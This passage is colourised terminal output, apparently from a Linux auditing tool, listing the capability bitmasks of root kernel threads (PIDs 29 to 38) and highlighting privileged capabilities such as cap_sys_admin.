  CapPrm: 0x000001ffffffffff=[1;31mcap_chown[0m,[1;31mcap_dac_override[0m,[1;31mcap_dac_read_search[0m,[1;31mcap_fowner[0m,[1;31mcap_fsetid[0m,[1;31mcap_kill[0m,[1;31mcap_setgid[0m,[1;31mcap_setuid[0m,[1;31mcap_setpcap[0m,cap_linux_immutable,[1;31mcap_net_bind_service[0m,cap_net_broadcast,[1;31mcap_net_admin[0m,[1;31mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31mcap_sys_module[0m,[1;31mcap_sys_rawio[0m,cap_sys_chroot,[1;31mcap_sys_ptrace[0m,cap_sys_pacct,[1;31mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31mcap_perfmon[0m,[1;31mcap_bpf[0m,cap_checkpoint_restore
  CapEff: 0x000001ffffffffff=[1;31;103mcap_chown[0m,[1;31;103mcap_dac_override[0m,[1;31;103mcap_dac_read_search[0m,[1;31;103mcap_fowner[0m,[1;31;103mcap_fsetid[0m,[1;31;103mcap_kill[0m,[1;31;103mcap_setgid[0m,[1;31;103mcap_setuid[0m,[1;31;103mcap_setpcap[0m,cap_linux_immutable,[1;31;103mcap_net_bind_service[0m,cap_net_broadcast,[1;31;103mcap_net_admin[0m,[1;31;103mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31;103mcap_sys_module[0m,[1;31;103mcap_sys_rawio[0m,cap_sys_chroot,[1;31;103mcap_sys_ptrace[0m,cap_sys_pacct,[1;31;103mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31;103mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31;103mcap_perfmon[0m,[1;31;103mcap_bpf[0m,cap_checkpoint_restore
  CapBnd: 0x000001ffffffffff=[1;31mcap_chown[0m,[1;31mcap_dac_override[0m,[1;31mcap_dac_read_search[0m,[1;31mcap_fowner[0m,[1;31mcap_fsetid[0m,[1;31mcap_kill[0m,[1;31mcap_setgid[0m,[1;31mcap_setuid[0m,[1;31mcap_setpcap[0m,cap_linux_immutable,[1;31mcap_net_bind_service[0m,cap_net_broadcast,[1;31mcap_net_admin[0m,[1;31mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31mcap_sys_module[0m,[1;31mcap_sys_rawio[0m,cap_sys_chroot,[1;31mcap_sys_ptrace[0m,cap_sys_pacct,[1;31mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31mcap_perfmon[0m,[1;31mcap_bpf[0m,cap_checkpoint_restore
  CapAmb: 0x0000000000000000=

PID 29 (kworker/1:1-events) user=root
  CapInh: 0x0000000000000000=
  CapPrm: 0x000001ffffffffff=[1;31mcap_chown[0m,[1;31mcap_dac_override[0m,[1;31mcap_dac_read_search[0m,[1;31mcap_fowner[0m,[1;31mcap_fsetid[0m,[1;31mcap_kill[0m,[1;31mcap_setgid[0m,[1;31mcap_setuid[0m,[1;31mcap_setpcap[0m,cap_linux_immutable,[1;31mcap_net_bind_service[0m,cap_net_broadcast,[1;31mcap_net_admin[0m,[1;31mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31mcap_sys_module[0m,[1;31mcap_sys_rawio[0m,cap_sys_chroot,[1;31mcap_sys_ptrace[0m,cap_sys_pacct,[1;31mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31mcap_perfmon[0m,[1;31mcap_bpf[0m,cap_checkpoint_restore
  CapEff: 0x000001ffffffffff=[1;31;103mcap_chown[0m,[1;31;103mcap_dac_override[0m,[1;31;103mcap_dac_read_search[0m,[1;31;103mcap_fowner[0m,[1;31;103mcap_fsetid[0m,[1;31;103mcap_kill[0m,[1;31;103mcap_setgid[0m,[1;31;103mcap_setuid[0m,[1;31;103mcap_setpcap[0m,cap_linux_immutable,[1;31;103mcap_net_bind_service[0m,cap_net_broadcast,[1;31;103mcap_net_admin[0m,[1;31;103mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31;103mcap_sys_module[0m,[1;31;103mcap_sys_rawio[0m,cap_sys_chroot,[1;31;103mcap_sys_ptrace[0m,cap_sys_pacct,[1;31;103mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31;103mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31;103mcap_perfmon[0m,[1;31;103mcap_bpf[0m,cap_checkpoint_restore
  CapBnd: 0x000001ffffffffff=[1;31mcap_chown[0m,[1;31mcap_dac_override[0m,[1;31mcap_dac_read_search[0m,[1;31mcap_fowner[0m,[1;31mcap_fsetid[0m,[1;31mcap_kill[0m,[1;31mcap_setgid[0m,[1;31mcap_setuid[0m,[1;31mcap_setpcap[0m,cap_linux_immutable,[1;31mcap_net_bind_service[0m,cap_net_broadcast,[1;31mcap_net_admin[0m,[1;31mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31mcap_sys_module[0m,[1;31mcap_sys_rawio[0m,cap_sys_chroot,[1;31mcap_sys_ptrace[0m,cap_sys_pacct,[1;31mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31mcap_perfmon[0m,[1;31mcap_bpf[0m,cap_checkpoint_restore
  CapAmb: 0x0000000000000000=

PID 30 (khungtaskd) user=root
  CapInh: 0x0000000000000000=
  CapPrm: 0x000001ffffffffff=[1;31mcap_chown[0m,[1;31mcap_dac_override[0m,[1;31mcap_dac_read_search[0m,[1;31mcap_fowner[0m,[1;31mcap_fsetid[0m,[1;31mcap_kill[0m,[1;31mcap_setgid[0m,[1;31mcap_setuid[0m,[1;31mcap_setpcap[0m,cap_linux_immutable,[1;31mcap_net_bind_service[0m,cap_net_broadcast,[1;31mcap_net_admin[0m,[1;31mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31mcap_sys_module[0m,[1;31mcap_sys_rawio[0m,cap_sys_chroot,[1;31mcap_sys_ptrace[0m,cap_sys_pacct,[1;31mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31mcap_perfmon[0m,[1;31mcap_bpf[0m,cap_checkpoint_restore
  CapEff: 0x000001ffffffffff=[1;31;103mcap_chown[0m,[1;31;103mcap_dac_override[0m,[1;31;103mcap_dac_read_search[0m,[1;31;103mcap_fowner[0m,[1;31;103mcap_fsetid[0m,[1;31;103mcap_kill[0m,[1;31;103mcap_setgid[0m,[1;31;103mcap_setuid[0m,[1;31;103mcap_setpcap[0m,cap_linux_immutable,[1;31;103mcap_net_bind_service[0m,cap_net_broadcast,[1;31;103mcap_net_admin[0m,[1;31;103mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31;103mcap_sys_module[0m,[1;31;103mcap_sys_rawio[0m,cap_sys_chroot,[1;31;103mcap_sys_ptrace[0m,cap_sys_pacct,[1;31;103mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31;103mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31;103mcap_perfmon[0m,[1;31;103mcap_bpf[0m,cap_checkpoint_restore
  CapBnd: 0x000001ffffffffff=[1;31mcap_chown[0m,[1;31mcap_dac_override[0m,[1;31mcap_dac_read_search[0m,[1;31mcap_fowner[0m,[1;31mcap_fsetid[0m,[1;31mcap_kill[0m,[1;31mcap_setgid[0m,[1;31mcap_setuid[0m,[1;31mcap_setpcap[0m,cap_linux_immutable,[1;31mcap_net_bind_service[0m,cap_net_broadcast,[1;31mcap_net_admin[0m,[1;31mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31mcap_sys_module[0m,[1;31mcap_sys_rawio[0m,cap_sys_chroot,[1;31mcap_sys_ptrace[0m,cap_sys_pacct,[1;31mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31mcap_perfmon[0m,[1;31mcap_bpf[0m,cap_checkpoint_restore
  CapAmb: 0x0000000000000000=

PID 31 (oom_reaper) user=root
  CapInh: 0x0000000000000000=
  CapPrm: 0x000001ffffffffff=[1;31mcap_chown[0m,[1;31mcap_dac_override[0m,[1;31mcap_dac_read_search[0m,[1;31mcap_fowner[0m,[1;31mcap_fsetid[0m,[1;31mcap_kill[0m,[1;31mcap_setgid[0m,[1;31mcap_setuid[0m,[1;31mcap_setpcap[0m,cap_linux_immutable,[1;31mcap_net_bind_service[0m,cap_net_broadcast,[1;31mcap_net_admin[0m,[1;31mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31mcap_sys_module[0m,[1;31mcap_sys_rawio[0m,cap_sys_chroot,[1;31mcap_sys_ptrace[0m,cap_sys_pacct,[1;31mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31mcap_perfmon[0m,[1;31mcap_bpf[0m,cap_checkpoint_restore
  CapEff: 0x000001ffffffffff=[1;31;103mcap_chown[0m,[1;31;103mcap_dac_override[0m,[1;31;103mcap_dac_read_search[0m,[1;31;103mcap_fowner[0m,[1;31;103mcap_fsetid[0m,[1;31;103mcap_kill[0m,[1;31;103mcap_setgid[0m,[1;31;103mcap_setuid[0m,[1;31;103mcap_setpcap[0m,cap_linux_immutable,[1;31;103mcap_net_bind_service[0m,cap_net_broadcast,[1;31;103mcap_net_admin[0m,[1;31;103mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31;103mcap_sys_module[0m,[1;31;103mcap_sys_rawio[0m,cap_sys_chroot,[1;31;103mcap_sys_ptrace[0m,cap_sys_pacct,[1;31;103mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31;103mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31;103mcap_perfmon[0m,[1;31;103mcap_bpf[0m,cap_checkpoint_restore
  CapBnd: 0x000001ffffffffff=[1;31mcap_chown[0m,[1;31mcap_dac_override[0m,[1;31mcap_dac_read_search[0m,[1;31mcap_fowner[0m,[1;31mcap_fsetid[0m,[1;31mcap_kill[0m,[1;31mcap_setgid[0m,[1;31mcap_setuid[0m,[1;31mcap_setpcap[0m,cap_linux_immutable,[1;31mcap_net_bind_service[0m,cap_net_broadcast,[1;31mcap_net_admin[0m,[1;31mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31mcap_sys_module[0m,[1;31mcap_sys_rawio[0m,cap_sys_chroot,[1;31mcap_sys_ptrace[0m,cap_sys_pacct,[1;31mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31mcap_perfmon[0m,[1;31mcap_bpf[0m,cap_checkpoint_restore
  CapAmb: 0x0000000000000000=

PID 33 (writeback) user=root
  CapInh: 0x0000000000000000=
  CapPrm: 0x000001ffffffffff=[1;31mcap_chown[0m,[1;31mcap_dac_override[0m,[1;31mcap_dac_read_search[0m,[1;31mcap_fowner[0m,[1;31mcap_fsetid[0m,[1;31mcap_kill[0m,[1;31mcap_setgid[0m,[1;31mcap_setuid[0m,[1;31mcap_setpcap[0m,cap_linux_immutable,[1;31mcap_net_bind_service[0m,cap_net_broadcast,[1;31mcap_net_admin[0m,[1;31mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31mcap_sys_module[0m,[1;31mcap_sys_rawio[0m,cap_sys_chroot,[1;31mcap_sys_ptrace[0m,cap_sys_pacct,[1;31mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31mcap_perfmon[0m,[1;31mcap_bpf[0m,cap_checkpoint_restore
  CapEff: 0x000001ffffffffff=[1;31;103mcap_chown[0m,[1;31;103mcap_dac_override[0m,[1;31;103mcap_dac_read_search[0m,[1;31;103mcap_fowner[0m,[1;31;103mcap_fsetid[0m,[1;31;103mcap_kill[0m,[1;31;103mcap_setgid[0m,[1;31;103mcap_setuid[0m,[1;31;103mcap_setpcap[0m,cap_linux_immutable,[1;31;103mcap_net_bind_service[0m,cap_net_broadcast,[1;31;103mcap_net_admin[0m,[1;31;103mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31;103mcap_sys_module[0m,[1;31;103mcap_sys_rawio[0m,cap_sys_chroot,[1;31;103mcap_sys_ptrace[0m,cap_sys_pacct,[1;31;103mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31;103mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31;103mcap_perfmon[0m,[1;31;103mcap_bpf[0m,cap_checkpoint_restore
  CapBnd: 0x000001ffffffffff=[1;31mcap_chown[0m,[1;31mcap_dac_override[0m,[1;31mcap_dac_read_search[0m,[1;31mcap_fowner[0m,[1;31mcap_fsetid[0m,[1;31mcap_kill[0m,[1;31mcap_setgid[0m,[1;31mcap_setuid[0m,[1;31mcap_setpcap[0m,cap_linux_immutable,[1;31mcap_net_bind_service[0m,cap_net_broadcast,[1;31mcap_net_admin[0m,[1;31mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31mcap_sys_module[0m,[1;31mcap_sys_rawio[0m,cap_sys_chroot,[1;31mcap_sys_ptrace[0m,cap_sys_pacct,[1;31mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31mcap_perfmon[0m,[1;31mcap_bpf[0m,cap_checkpoint_restore
  CapAmb: 0x0000000000000000=

PID 34 (kcompactd0) user=root
  CapInh: 0x0000000000000000=
  CapPrm: 0x000001ffffffffff=[1;31mcap_chown[0m,[1;31mcap_dac_override[0m,[1;31mcap_dac_read_search[0m,[1;31mcap_fowner[0m,[1;31mcap_fsetid[0m,[1;31mcap_kill[0m,[1;31mcap_setgid[0m,[1;31mcap_setuid[0m,[1;31mcap_setpcap[0m,cap_linux_immutable,[1;31mcap_net_bind_service[0m,cap_net_broadcast,[1;31mcap_net_admin[0m,[1;31mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31mcap_sys_module[0m,[1;31mcap_sys_rawio[0m,cap_sys_chroot,[1;31mcap_sys_ptrace[0m,cap_sys_pacct,[1;31mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31mcap_perfmon[0m,[1;31mcap_bpf[0m,cap_checkpoint_restore
  CapEff: 0x000001ffffffffff=[1;31;103mcap_chown[0m,[1;31;103mcap_dac_override[0m,[1;31;103mcap_dac_read_search[0m,[1;31;103mcap_fowner[0m,[1;31;103mcap_fsetid[0m,[1;31;103mcap_kill[0m,[1;31;103mcap_setgid[0m,[1;31;103mcap_setuid[0m,[1;31;103mcap_setpcap[0m,cap_linux_immutable,[1;31;103mcap_net_bind_service[0m,cap_net_broadcast,[1;31;103mcap_net_admin[0m,[1;31;103mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31;103mcap_sys_module[0m,[1;31;103mcap_sys_rawio[0m,cap_sys_chroot,[1;31;103mcap_sys_ptrace[0m,cap_sys_pacct,[1;31;103mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31;103mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31;103mcap_perfmon[0m,[1;31;103mcap_bpf[0m,cap_checkpoint_restore
  CapBnd: 0x000001ffffffffff=[1;31mcap_chown[0m,[1;31mcap_dac_override[0m,[1;31mcap_dac_read_search[0m,[1;31mcap_fowner[0m,[1;31mcap_fsetid[0m,[1;31mcap_kill[0m,[1;31mcap_setgid[0m,[1;31mcap_setuid[0m,[1;31mcap_setpcap[0m,cap_linux_immutable,[1;31mcap_net_bind_service[0m,cap_net_broadcast,[1;31mcap_net_admin[0m,[1;31mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31mcap_sys_module[0m,[1;31mcap_sys_rawio[0m,cap_sys_chroot,[1;31mcap_sys_ptrace[0m,cap_sys_pacct,[1;31mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31mcap_perfmon[0m,[1;31mcap_bpf[0m,cap_checkpoint_restore
  CapAmb: 0x0000000000000000=

PID 35 (ksmd) user=root
  CapInh: 0x0000000000000000=
  CapPrm: 0x000001ffffffffff=[1;31mcap_chown[0m,[1;31mcap_dac_override[0m,[1;31mcap_dac_read_search[0m,[1;31mcap_fowner[0m,[1;31mcap_fsetid[0m,[1;31mcap_kill[0m,[1;31mcap_setgid[0m,[1;31mcap_setuid[0m,[1;31mcap_setpcap[0m,cap_linux_immutable,[1;31mcap_net_bind_service[0m,cap_net_broadcast,[1;31mcap_net_admin[0m,[1;31mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31mcap_sys_module[0m,[1;31mcap_sys_rawio[0m,cap_sys_chroot,[1;31mcap_sys_ptrace[0m,cap_sys_pacct,[1;31mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31mcap_perfmon[0m,[1;31mcap_bpf[0m,cap_checkpoint_restore
  CapEff: 0x000001ffffffffff=[1;31;103mcap_chown[0m,[1;31;103mcap_dac_override[0m,[1;31;103mcap_dac_read_search[0m,[1;31;103mcap_fowner[0m,[1;31;103mcap_fsetid[0m,[1;31;103mcap_kill[0m,[1;31;103mcap_setgid[0m,[1;31;103mcap_setuid[0m,[1;31;103mcap_setpcap[0m,cap_linux_immutable,[1;31;103mcap_net_bind_service[0m,cap_net_broadcast,[1;31;103mcap_net_admin[0m,[1;31;103mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31;103mcap_sys_module[0m,[1;31;103mcap_sys_rawio[0m,cap_sys_chroot,[1;31;103mcap_sys_ptrace[0m,cap_sys_pacct,[1;31;103mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31;103mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31;103mcap_perfmon[0m,[1;31;103mcap_bpf[0m,cap_checkpoint_restore
  CapBnd: 0x000001ffffffffff=[1;31mcap_chown[0m,[1;31mcap_dac_override[0m,[1;31mcap_dac_read_search[0m,[1;31mcap_fowner[0m,[1;31mcap_fsetid[0m,[1;31mcap_kill[0m,[1;31mcap_setgid[0m,[1;31mcap_setuid[0m,[1;31mcap_setpcap[0m,cap_linux_immutable,[1;31mcap_net_bind_service[0m,cap_net_broadcast,[1;31mcap_net_admin[0m,[1;31mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31mcap_sys_module[0m,[1;31mcap_sys_rawio[0m,cap_sys_chroot,[1;31mcap_sys_ptrace[0m,cap_sys_pacct,[1;31mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31mcap_perfmon[0m,[1;31mcap_bpf[0m,cap_checkpoint_restore
  CapAmb: 0x0000000000000000=

PID 36 (khugepaged) user=root
  CapInh: 0x0000000000000000=
  CapPrm: 0x000001ffffffffff=[1;31mcap_chown[0m,[1;31mcap_dac_override[0m,[1;31mcap_dac_read_search[0m,[1;31mcap_fowner[0m,[1;31mcap_fsetid[0m,[1;31mcap_kill[0m,[1;31mcap_setgid[0m,[1;31mcap_setuid[0m,[1;31mcap_setpcap[0m,cap_linux_immutable,[1;31mcap_net_bind_service[0m,cap_net_broadcast,[1;31mcap_net_admin[0m,[1;31mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31mcap_sys_module[0m,[1;31mcap_sys_rawio[0m,cap_sys_chroot,[1;31mcap_sys_ptrace[0m,cap_sys_pacct,[1;31mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31mcap_perfmon[0m,[1;31mcap_bpf[0m,cap_checkpoint_restore
  CapEff: 0x000001ffffffffff=[1;31;103mcap_chown[0m,[1;31;103mcap_dac_override[0m,[1;31;103mcap_dac_read_search[0m,[1;31;103mcap_fowner[0m,[1;31;103mcap_fsetid[0m,[1;31;103mcap_kill[0m,[1;31;103mcap_setgid[0m,[1;31;103mcap_setuid[0m,[1;31;103mcap_setpcap[0m,cap_linux_immutable,[1;31;103mcap_net_bind_service[0m,cap_net_broadcast,[1;31;103mcap_net_admin[0m,[1;31;103mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31;103mcap_sys_module[0m,[1;31;103mcap_sys_rawio[0m,cap_sys_chroot,[1;31;103mcap_sys_ptrace[0m,cap_sys_pacct,[1;31;103mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31;103mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31;103mcap_perfmon[0m,[1;31;103mcap_bpf[0m,cap_checkpoint_restore
  CapBnd: 0x000001ffffffffff=[1;31mcap_chown[0m,[1;31mcap_dac_override[0m,[1;31mcap_dac_read_search[0m,[1;31mcap_fowner[0m,[1;31mcap_fsetid[0m,[1;31mcap_kill[0m,[1;31mcap_setgid[0m,[1;31mcap_setuid[0m,[1;31mcap_setpcap[0m,cap_linux_immutable,[1;31mcap_net_bind_service[0m,cap_net_broadcast,[1;31mcap_net_admin[0m,[1;31mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31mcap_sys_module[0m,[1;31mcap_sys_rawio[0m,cap_sys_chroot,[1;31mcap_sys_ptrace[0m,cap_sys_pacct,[1;31mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31mcap_perfmon[0m,[1;31mcap_bpf[0m,cap_checkpoint_restore
  CapAmb: 0x0000000000000000=

PID 37 (kintegrityd) user=root
  CapInh: 0x0000000000000000=
  CapPrm: 0x000001ffffffffff=[1;31mcap_chown[0m,[1;31mcap_dac_override[0m,[1;31mcap_dac_read_search[0m,[1;31mcap_fowner[0m,[1;31mcap_fsetid[0m,[1;31mcap_kill[0m,[1;31mcap_setgid[0m,[1;31mcap_setuid[0m,[1;31mcap_setpcap[0m,cap_linux_immutable,[1;31mcap_net_bind_service[0m,cap_net_broadcast,[1;31mcap_net_admin[0m,[1;31mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31mcap_sys_module[0m,[1;31mcap_sys_rawio[0m,cap_sys_chroot,[1;31mcap_sys_ptrace[0m,cap_sys_pacct,[1;31mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31mcap_perfmon[0m,[1;31mcap_bpf[0m,cap_checkpoint_restore
  CapEff: 0x000001ffffffffff=[1;31;103mcap_chown[0m,[1;31;103mcap_dac_override[0m,[1;31;103mcap_dac_read_search[0m,[1;31;103mcap_fowner[0m,[1;31;103mcap_fsetid[0m,[1;31;103mcap_kill[0m,[1;31;103mcap_setgid[0m,[1;31;103mcap_setuid[0m,[1;31;103mcap_setpcap[0m,cap_linux_immutable,[1;31;103mcap_net_bind_service[0m,cap_net_broadcast,[1;31;103mcap_net_admin[0m,[1;31;103mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31;103mcap_sys_module[0m,[1;31;103mcap_sys_rawio[0m,cap_sys_chroot,[1;31;103mcap_sys_ptrace[0m,cap_sys_pacct,[1;31;103mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31;103mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31;103mcap_perfmon[0m,[1;31;103mcap_bpf[0m,cap_checkpoint_restore
  CapBnd: 0x000001ffffffffff=[1;31mcap_chown[0m,[1;31mcap_dac_override[0m,[1;31mcap_dac_read_search[0m,[1;31mcap_fowner[0m,[1;31mcap_fsetid[0m,[1;31mcap_kill[0m,[1;31mcap_setgid[0m,[1;31mcap_setuid[0m,[1;31mcap_setpcap[0m,cap_linux_immutable,[1;31mcap_net_bind_service[0m,cap_net_broadcast,[1;31mcap_net_admin[0m,[1;31mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31mcap_sys_module[0m,[1;31mcap_sys_rawio[0m,cap_sys_chroot,[1;31mcap_sys_ptrace[0m,cap_sys_pacct,[1;31mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31mcap_perfmon[0m,[1;31mcap_bpf[0m,cap_checkpoint_restore
  CapAmb: 0x0000000000000000=

PID 38 (kblockd) user=root
  CapInh: 0x0000000000000000=
